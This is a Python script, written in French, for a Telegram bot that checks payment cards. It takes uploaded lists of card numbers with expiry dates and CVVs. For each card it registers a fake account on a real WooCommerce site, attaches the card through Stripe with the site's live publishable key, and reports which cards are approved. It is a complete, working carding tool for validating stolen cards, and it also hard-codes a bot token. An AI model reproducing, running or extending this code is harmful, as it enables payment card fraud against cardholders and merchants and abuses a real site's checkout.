import os, sys, subprocess, requests, random, string, re, time, uuid
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio

init(autoreset=True)

# ---- Fonctions originales (inchangées) ----
def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def format_card(cc_line):
    try:
        parts = cc_line.strip().split('|')
        if len(parts) < 4: return None
        n, m, y, c = parts[0], parts[1], parts[2], parts[3]
        n = n.replace(' ', '')
        if len(m) == 1: m = "0" + m
        elif len(m) > 2: m = m[-2:]
        if len(y) == 4: y = y[-2:]
        elif len(y) == 1: y = "0" + y
        return f"{n}|{m}|{y}|{c}"
    except: return None

def save_res(filename, text):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def process_card(cc_line):
    formatted = format_card(cc_line)
    if not formatted:
        return f"{Fore.YELLOW}⚠️ | {cc_line} | Format invalide"
    n, m, y, c = formatted.split('|')
    session = requests.Session()
    username = random_string(8)
    email = f"{username}@gmail.com"
    headers_base = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }
    try:
        # Inscription
        reg_url = "https://www.wpautotranslate.com/my-account/"
        resp_reg_page = session.get(reg_url, headers=headers_base, timeout=20)
        register_nonce = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', resp_reg_page.text)
        if not register_nonce:
            return f"{Fore.YELLOW}⚠️ | {formatted} | Nonce d'inscription manquant"
        register_nonce = register_nonce.group(1)
        payload_reg = {
            'email': email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': reg_url,
            'wc_order_attribution_session_start_time': time.strftime("%Y-%m-%d %H:%M:%S"),
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers_base['User-Agent'],
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        session.post(reg_url, data=payload_reg, headers=headers_base, allow_redirects=True, timeout=20)
        add_pm_url = "https://www.wpautotranslate.com/my-account/add-payment-method/"
        resp_add_page = session.get(add_pm_url, headers=headers_base, timeout=20)
        pattern_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', resp_add_page.text)
        ajax_nonce = pattern_nonce.group(1) if pattern_nonce else None
        if not ajax_nonce:
            input_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', resp_add_page.text)
            ajax_nonce = input_nonce.group(1) if input_nonce else None
        if not ajax_nonce:
            return f"{Fore.YELLOW}⚠️ | {formatted} | Nonce AJAX introuvable"
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            'User-Agent': headers_base['User-Agent'],
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        stripe_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': c,
            'card[exp_year]': y,
            'card[exp_month]': m,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'ES',
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; payment-element; deferred-intent',
            'key': 'pk_live_51HcnSQKiRiPUJJGCqxkxK1CavaDzUhp0UB3fSZBlC3PE4UY08yBldvWprcTLbU1tABog9vbT0VX4xozB1Ot8XuAi002qBHGFOe',
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
        }
        resp_stripe = session.post(stripe_url, data=stripe_data, headers=stripe_headers, timeout=10)
        stripe_json = resp_stripe.json()
        pm_id = stripe_json.get('id')
        if not pm_id:
            error_msg = stripe_json.get('error', {}).get('message', 'Erreur Stripe')
            return f"{Fore.RED}❌ | {formatted} | {error_msg}"
        ajax_url = "https://www.wpautotranslate.com/wp-admin/admin-ajax.php"
        ajax_headers = {
            'User-Agent': headers_base['User-Agent'],
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': add_pm_url,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        final_resp = session.post(ajax_url, data=ajax_data, headers=ajax_headers, timeout=10)
        try:
            res_json = final_resp.json()
        except:
            soup = BeautifulSoup(final_resp.text, 'html.parser')
            error_div = soup.find('div', {'id': 'give_error_stripe_payment_intent_error'})
            if error_div:
                error_text = error_div.get_text(strip=True)
                return f"{Fore.RED}❌ | {formatted} | {error_text}"
            else:
                return f"{Fore.YELLOW}⚠️ | {formatted} | Réponse inconnue (HTML)"
        if res_json.get('success'):
            save_res("approved.txt", formatted)
            return f"{Fore.GREEN}✅ APPROUVÉE | {formatted} | Moyen de paiement ajouté"
        else:
            error_msg = res_json.get('data', {}).get('error', {}).get('message', 'Erreur inconnue')
            save_res("declined.txt", formatted)
            return f"{Fore.RED}❌ REFUSÉE | {formatted} | {error_msg}"
    except Exception as e:
        return f"{Fore.YELLOW}⚠️ | {formatted} | {str(e)}"

# ---- Partie Telegram ----
TOKEN = "8449228250:AAHi2E5zqoivQ7MG_AKmRgRQQNsPO4lud_8"
TEMP_DIR = "temp"
os.makedirs(TEMP_DIR, exist_ok=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot vérificateur de cartes\n"
        "Envoie-moi un fichier .txt avec une carte par ligne (format: numéro|mois|année|cvv)\n"
        "Exemple: 4111111111111111|12|2026|123\n\n"
        "Je traiterai jusqu'à 3 cartes simultanément."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Envoie un fichier .txt uniquement.")
        return
    file = await context.bot.get_file(document.file_id)
    file_path = os.path.join(TEMP_DIR, document.file_name)
    await file.download_to_drive(file_path)
    await update.message.reply_text(f"📥 Fichier reçu : {document.file_name}\n⏳ Début vérification...")
    with open(file_path, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]
    if not cards:
        await update.message.reply_text("⚠️ Fichier vide.")
        return
    if os.path.exists("approved.txt"): os.remove("approved.txt")
    if os.path.exists("declined.txt"): os.remove("declined.txt")
    results = []
    with ThreadPoolExecutor(max_workers=3) as executor:
        for res in executor.map(process_card, cards):
            results.append(res)
    await update.message.reply_text("\n".join(results[:20]) if len(results)<=20 else f"{len(results)} cartes traitées. Résultats en fichiers.")
    if os.path.exists("approved.txt"):
        with open("approved.txt", "rb") as f:
            await update.message.reply_document(f, filename="approved.txt", caption="✅ Approuvées")
    if os.path.exists("declined.txt"):
        with open("declined.txt", "rb") as f:
            await update.message.reply_document(f, filename="declined.txt", caption="❌ Refusées")
    os.remove(file_path)
    await update.message.reply_text("✅ Terminé.")

async def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("Bot démarré...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
